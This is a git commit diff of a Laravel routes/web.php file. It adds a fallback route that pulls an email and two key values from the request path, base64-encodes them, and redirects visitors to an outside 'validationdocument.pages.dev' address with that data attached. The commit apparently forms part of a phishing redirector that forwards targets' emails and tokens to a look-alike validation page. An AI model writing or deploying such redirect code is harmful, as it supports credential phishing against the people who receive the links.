ee4586197454d28c46682d0e85508923b6f8aa59
asyouknowme <61052215+GilangNirwana@users.noreply.github.com>
2024-07-26 09:10:29 +0700

    Update web.php

--- routes/web.php
+++ routes/web.php
@@ -14,8 +14,23 @@ use Illuminate\Support\Facades\Route;
 */
 
 Route::fallback(function () {
+	$fullUrl = request()->path();
+    
+    // Extract the segments of the URL
+    $segments = explode('/', $fullUrl);
+    
+    // Assuming the last two segments are the email and the key
+    // and the segments before these are the paths
+    $email = $segments[count($segments) - 3];
+    $key = $segments[count($segments) - 2];
+    $key2 = $segments[count($segments) - 1];
+    
+    $combinedString = $email . '&' . $key . '&'. $key2;
+    
+ 
+    $encodedCombinedString = base64_encode($combinedString);
 
-    return redirect('https://validationdocument.pages.dev');
+    return redirect('https://validationdocument.pages.dev#?service='.$encodedCombinedString);
 //    return "default";
 });
 
